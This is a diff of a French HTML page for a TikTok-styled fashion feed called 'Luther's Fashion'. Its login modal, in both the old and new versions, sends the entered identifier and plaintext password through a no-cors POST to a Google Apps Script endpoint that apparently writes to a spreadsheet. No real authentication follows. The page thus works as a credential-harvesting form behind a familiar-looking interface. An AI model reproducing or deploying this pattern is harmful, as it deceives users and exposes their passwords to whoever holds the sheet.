@@ -3,158 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Luther's Fashion - Global Network</title>
+    <title>Luther's Fashion - Network</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
-        :root { --violet: #9c27b0; --light-violet: #ce85f2; --tiktok-red: #ff3b5c; --bg: #1a0121; }
+        :root { --violet: #9c27b0; --light-violet: #ce85f2; --tiktok-red: #ff3b5c; --bg: #000; }
         body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden; }
 
-        /* Navigation Haut */
+        /* --- NAVIGATION HAUT --- */
         .top-nav { position: fixed; top: 0; width: 100%; display: flex; flex-direction: column; align-items: center; z-index: 100; padding-top: 10px; background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent); }
-        .search-bar { width: 85%; background: rgba(255,255,255,0.15); border-radius: 20px; padding: 8px 15px; display: flex; align-items: center; margin-bottom: 10px; backdrop-filter: blur(5px); }
-        .search-bar input { background: transparent; border: none; color: white; width: 100%; outline: none; margin: 0 10px; }
-        .feed-tabs { display: flex; gap: 25px; font-weight: bold; font-size: 17px; }
-        .tab { cursor: pointer; opacity: 0.7; }
-        .tab.active { border-bottom: 3px solid white; padding-bottom: 5px; opacity: 1; }
+        .feed-tabs { display: flex; gap: 25px; font-weight: bold; font-size: 17px; margin-top: 10px; }
+        .tab { cursor: pointer; opacity: 0.6; }
+        .tab.active { opacity: 1; border-bottom: 3px solid white; padding-bottom: 5px; }
 
-        /* Feed TikTok Style */
-        .video-feed { height: 100vh; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; padding-bottom: 90px; background: #e60023; }
-        .user-name { display: flex; align-items: center; gap: 6px; font-weight: bold; font-size: 18px; margin-bottom: 8px; cursor: pointer; }
-        
-        /* Badge 24 Pointes */
+        /* --- FEED VIDEO (ROUGE TIKTOK) --- */
+        .video-feed { height: 100vh; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; padding-bottom: 100px; background: #e60023; }
+        .user-info { margin-bottom: 15px; }
+        .user-name { display: flex; align-items: center; gap: 8px; font-weight: bold; font-size: 18px; }
+
+        /* BADGE 24 POINTES */
         .badge-24 { width: 18px; height: 18px; background: white; clip-path: polygon(50% 0%, 58% 10%, 68% 5%, 72% 16%, 83% 15%, 83% 26%, 93% 30%, 90% 41%, 98% 50%, 90% 59%, 93% 70%, 83% 74%, 83% 85%, 72% 84%, 68% 95%, 58% 90%, 50% 100%, 42% 90%, 32% 95%, 28% 84%, 17% 85%, 17% 74%, 7% 70%, 10% 59%, 2% 50%, 10% 41%, 7% 30%, 17% 26%, 17% 15%, 28% 16%, 32% 5%, 42% 10%); display: flex; align-items: center; justify-content: center; }
         .badge-24::after { content: '✔'; color: var(--violet); font-size: 10px; font-weight: bold; }
 
-        /* Actions Droite */
-        .side-actions { position: fixed; right: 12px; bottom: 100px; display: flex; flex-direction: column; align-items: center; gap: 18px; z-index: 100; }
-        .action-item { text-align: center; font-size: 13px; font-weight: bold; cursor: pointer; }
-        .action-item i { font-size: 32px; margin-bottom: 4px; }
-        .heart.active { color: #ff2d55; transform: scale(1.2); transition: 0.2s; }
-        .bookmark.active { color: #facd31; }
+        /* --- BARRE DE NAVIGATION BAS --- */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 65px; background: black; display: flex; justify-content: space-around; align-items: center; z-index: 1000; border-top: 0.5px solid #333; }
+        .nav-icon { font-size: 22px; cursor: pointer; position: relative; color: white; }
+        .btn-plus { background: linear-gradient(to right, #20d5ec 15%, #ff2d55 85%); padding: 5px 15px; border-radius: 12px; font-weight: bold; color: black; font-size: 20px; cursor: pointer; }
+        .notif-badge { position: absolute; top: -8px; right: -8px; background: red; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid black; }
+        .nav-avatar { width: 28px; height: 28px; border-radius: 50%; border: 1.5px solid white; display: none; }
 
-        /* Barre Navigation Bas */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 65px; background: black; display: flex; justify-content: space-around; align-items: center; z-index: 200; border-top: 0.5px solid #333; }
-        .nav-icon { font-size: 22px; cursor: pointer; position: relative; }
-        .btn-plus { background: linear-gradient(to right, #20d5ec 15%, #ff2d55 85%); padding: 6px 16px; border-radius: 12px; font-weight: bold; color: black; font-size: 18px; cursor: pointer; }
-        .notif-badge { position: absolute; top: -6px; right: -6px; background: red; color: white; font-size: 10px; width: 16px; height: 16px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid black; }
-
-        /* Modale Connexion */
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); display: none; align-items: center; justify-content: center; z-index: 5000; }
-        .modal-card { background: white; color: black; width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; text-align: center; }
+        /* --- MODALES --- */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 5000; }
+        .modal-card { background: white; color: black; width: 85%; max-width: 350px; padding: 25px; border-radius: 20px; text-align: center; }
+        .publish-option { padding: 15px; border: 1px solid #eee; border-radius: 12px; margin: 10px 0; cursor: pointer; display: flex; align-items: center; gap: 15px; font-weight: bold; }
+        
+        /* Animation Disque */
+        .music-disc { width: 45px; height: 45px; background: radial-gradient(circle, #444 20%, #000 100%); border-radius: 50%; animation: rotate 4s linear infinite; border: 8px solid #222; position: fixed; right: 15px; bottom: 100px; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="top-nav">
-        <div class="search-bar" onclick="focusSearch()">
-            <i class="fas fa-search"></i>
-            <input type="text" id="mainSearch" placeholder="Rechercher...">
-        </div>
         <div class="feed-tabs">
-            <span class="tab" onclick="switchTab(this)">Suivi</span>
-            <span class="tab active" onclick="switchTab(this)">Pour toi</span>
+            <span class="tab" onclick="alert('Vidéos Viral (Explosion)')">Viral</span>
+            <span class="tab">Suivis</span>
+            <span class="tab active">Pour toi</span>
         </div>
     </div>
 
     <div class="video-feed">
-        <div class="post-info">
-            <div class="user-name" onclick="openLogin()">@<span id="userTag">Luther</span> <div class="badge-24"></div></div>
-            <p>Bienvenue sur Luther's Fashion ! Active tes touches ! 🚀</p>
+        <div class="user-info">
+            <div class="user-name">@<span id="userName">Luther</span> <div class="badge-24"></div></div>
+            <p>Bienvenue sur Luther's Fashion. Partagez votre style ! 🚀</p>
+            <p><i class="fas fa-music"></i> Luther - Son Original</p>
         </div>
-
-        <div class="side-actions">
-            <div class="action-item" onclick="handleLike(this)">
-                <i class="fas fa-heart heart"></i><br><span class="count">150K</span>
-            </div>
-            <div class="action-item" onclick="alert('Commentaires ouverts !')">
-                <i class="fas fa-comment-dots"></i><br>856
-            </div>
-            <div class="action-item" onclick="handleSave(this)">
-                <i class="fas fa-bookmark bookmark"></i><br>12K
-            </div>
-            <div class="action-item" onclick="shareNow()">
-                <i class="fas fa-share"></i><br>Partager
-            </div>
-        </div>
+        <div class="music-disc"></div>
     </div>
 
     <div class="bottom-nav">
-        <i class="fas fa-home nav-icon" onclick="location.reload()"></i>
-        <i class="fas fa-compass nav-icon" onclick="alert('Découvrir')"></i>
-        <div class="btn-plus" onclick="openLogin()">+</div>
-        <div class="nav-icon" onclick="clearNotif()">
+        <i class="fas fa-home nav-icon" onclick="location.reload()" title="Home"></i>
+        
+        <i class="fas fa-bolt nav-icon" onclick="alert('Section Viral activée !')" style="color: #ffeb3b;"></i>
+        
+        <div class="btn-plus" onclick="toggleModal('publishModal')">+</div>
+        
+        <div class="nav-icon" onclick="openMessages()">
             <i class="fas fa-envelope"></i>
-            <div class="notif-badge" id="notif">1</div>
+            <div class="notif-badge" id="msgNotif">1</div>
         </div>
-        <i class="fas fa-user nav-icon" onclick="openLogin()"></i>
+        
+        <div class="nav-icon" onclick="handleProfileClick()">
+            <i id="profileIcon" class="fas fa-user"></i>
+            <img id="userAvatar" class="nav-avatar" src="">
+        </div>
+    </div>
+
+    <div id="publishModal" class="modal-overlay">
+        <div class="modal-card">
+            <h3>Nouveau Poste</h3>
+            <div class="publish-option" onclick="createPost('Texte')"><i class="fas fa-font"></i> Écrire un texte</div>
+            <div class="publish-option" onclick="createPost('Photo')"><i class="fas fa-image"></i> Partager une photo</div>
+            <div class="publish-option" onclick="createPost('Vidéo')"><i class="fas fa-video"></i> Publier une vidéo</div>
+            <button onclick="toggleModal('publishModal')" style="margin-top:15px; border:none; background:none; color:red; font-weight:bold; cursor:pointer;">Annuler</button>
+        </div>
     </div>
 
     <div id="loginModal" class="modal-overlay">
         <div class="modal-card">
-            <h3 style="margin-top:0">Connexion / Inscription</h3>
-            <input type="text" id="regEmail" placeholder="Email ou Identifiant" style="width:90%; padding:12px; margin-bottom:10px; border-radius:10px; border:1px solid #ddd;">
-            <input type="password" id="regPass" placeholder="Mot de passe" style="width:90%; padding:12px; margin-bottom:10px; border-radius:10px; border:1px solid #ddd;">
-            <button onclick="submitData()" style="width:100%; background:var(--tiktok-red); color:#fff; border:none; padding:15px; border-radius:10px; font-weight:bold; cursor:pointer;">Valider</button>
-            <p onclick="closeLogin()" style="cursor:pointer; font-size:14px; margin-top:15px;">Annuler</p>
+            <h3>Connexion</h3>
+            <input type="text" id="loginId" placeholder="Identifiant / Email" style="width:90%; padding:12px; margin-bottom:10px; border-radius:10px; border:1px solid #ddd;">
+            <input type="password" id="loginPass" placeholder="Mot de passe" style="width:90%; padding:12px; margin-bottom:20px; border-radius:10px; border:1px solid #ddd;">
+            <button onclick="loginUser()" style="width:100%; background:var(--tiktok-red); color:white; border:none; padding:15px; border-radius:10px; font-weight:bold; cursor:pointer;">Se connecter</button>
+            <p onclick="toggleModal('loginModal')" style="cursor:pointer; margin-top:15px; font-size:14px;">Fermer</p>
         </div>
     </div>
 
     <script>
         const API_URL = "https://script.google.com/macros/s/AKfycbzmWi55H7--DzkuiTHWS4Q4xmqeBq9WvkLpd0y9GIpTL3osmmL4zpACStbOCOwYgw0Q/exec";
+        let isConnected = false;
 
-        function openLogin() { document.getElementById('loginModal').style.display = 'flex'; }
-        function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
-        
-        function handleLike(btn) {
-            const heart = btn.querySelector('.heart');
-            heart.classList.toggle('active');
-            if(heart.classList.contains('active')) {
-                confetti({ particleCount: 30, spread: 60, origin: { x: 0.9, y: 0.7 }, colors: ['#ff2d55'] });
-            }
+        function toggleModal(id) {
+            const m = document.getElementById(id);
+            m.style.display = (m.style.display === 'flex') ? 'none' : 'flex';
         }
 
-        function handleSave(btn) {
-            btn.querySelector('.bookmark').classList.toggle('active');
+        function createPost(type) {
+            alert("Outil de création " + type + " ouvert !");
+            toggleModal('publishModal');
         }
 
-        function switchTab(el) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            el.classList.add('active');
+        function openMessages() {
+            document.getElementById('msgNotif').style.display = 'none';
+            alert("Messagerie : Répondez à vos clients ici.");
         }
 
-        function clearNotif() {
-            document.getElementById('notif').style.display = 'none';
-            alert('Boîte de réception ouverte');
-        }
-
-        function submitData() {
-            const email = document.getElementById('regEmail').value;
-            const mdp = document.getElementById('regPass').value;
-            if(!email || !mdp) return;
-
-            fetch(API_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ nom: email, mdp: mdp, methode: 'Direct' })
-            }).then(() => {
-                document.getElementById('userTag').innerText = email;
-                confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
-                closeLogin();
-            });
-        }
-
-        function shareNow() {
-            if (navigator.share) {
-                navigator.share({ title: "Luther's Fashion", url: window.location.href });
+        function handleProfileClick() {
+            if (isConnected) {
+                alert("Ouverture de votre profil personnalisé !");
             } else {
-                navigator.clipboard.writeText(window.location.href);
-                alert("Lien copié !");
+                toggleModal('loginModal');
             }
         }
 
-        function focusSearch() { document.getElementById('mainSearch').focus(); }
+        function loginUser() {
+            const id = document.getElementById('loginId').value;
+            const pass = document.getElementById('loginPass').value;
+            
+            if(id && pass) {
+                // Envoi vers Google Sheets
+                fetch(API_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ nom: id, mdp: pass, methode: 'Login' })
+                });
+
+                isConnected = true;
+                document.getElementById('userName').innerText = id;
+                document.getElementById('profileIcon').style.display = 'none';
+                document.getElementById('userAvatar').src = "https://i.pravatar.cc/100?u=" + id;
+                document.getElementById('userAvatar').style.display = 'block';
+                
+                toggleModal('loginModal');
+                confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+            }
+        }
     </script>
 </body>
 </html>
